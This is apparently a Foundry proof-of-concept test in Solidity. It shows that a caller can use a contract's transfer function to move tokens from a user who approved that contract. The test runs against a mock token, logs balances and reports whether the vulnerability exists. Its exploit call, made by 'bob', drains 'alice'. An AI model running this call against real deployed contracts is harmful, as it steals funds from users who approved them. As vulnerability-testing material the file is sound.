// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol";

contract UnauthorizedTransferTest is Test {
    // Contracts
    demo demoContract;
    ERC20Mock token;
    
    // Addresses
    address alice = address(0x1);
    address bob = address(0x2);
    address feeCollector;

    function setUp() public {
        // Deploy token and mint to Alice
        token = new ERC20Mock();
        token.mint(alice, 100e18);
        
        // Deploy demo contract
        demoContract = new demo();
        feeCollector = demoContract.feeCollector();

        // Alice approves demo contract to spend her tokens
        vm.prank(alice);
        token.approve(address(demoContract), type(uint256).max);
    }

    function testUnauthorizedTokenTransfer() public {
        uint amount = 50e18;
        address[] memory recipients = new address[](1);
        recipients[0] = bob;

        console2.log("--- BEFORE-Trigger ---");
        uint256 aliceBalBefore = token.balanceOf(alice);
        uint256 bobBalBefore = token.balanceOf(bob);
        uint256 feeCollectorBalBefore = token.balanceOf(feeCollector);
        console2.log("Alice balance (before):", aliceBalBefore);
        console2.log("Bob balance (before):", bobBalBefore);
        console2.log("FeeCollector balance (before):", feeCollectorBalBefore);

        console2.log("--- Trigger: Bob executes unauthorized transfer ---");
        vm.prank(bob);
        demoContract.transfer(alice, address(token), recipients, amount);

        console2.log("--- AFTER-Trigger ---");
        uint256 aliceBalAfter = token.balanceOf(alice);
        uint256 bobBalAfter = token.balanceOf(bob);
        uint256 feeCollectorBalAfter = token.balanceOf(feeCollector);
        console2.log("Alice balance (after):", aliceBalAfter);
        console2.log("Bob balance (after):", bobBalAfter);
        console2.log("FeeCollector balance (after):", feeCollectorBalAfter);

        // Calculate expected state changes
        uint256 feePercentage = demoContract.feePercentage();
        uint256 expectedFee = amount * feePercentage / 100;
        uint256 expectedBobGain = amount - expectedFee;
        
        bool aliceReducedCorrectly = (aliceBalBefore - aliceBalAfter) == amount;
        bool bobIncreasedCorrectly = (bobBalAfter - bobBalBefore) == expectedBobGain;
        bool feeCollectorIncreasedCorrectly = (feeCollectorBalAfter - feeCollectorBalBefore) == expectedFee;
        
        console2.log("Alice change correct:", aliceReducedCorrectly);
        console2.log("Bob change correct:", bobIncreasedCorrectly);
        console2.log("FeeCollector change correct:", feeCollectorIncreasedCorrectly);

        if (aliceReducedCorrectly && bobIncreasedCorrectly && feeCollectorIncreasedCorrectly) {
            console2.log("Vulnerability Exists: Unauthorized token transfer executed successfully");
        } else {
            console2.log("Vulnerability not Exist: Balance changes do not match transfer expectations");
        }
    }
}

// Minimal ERC20 mock
contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}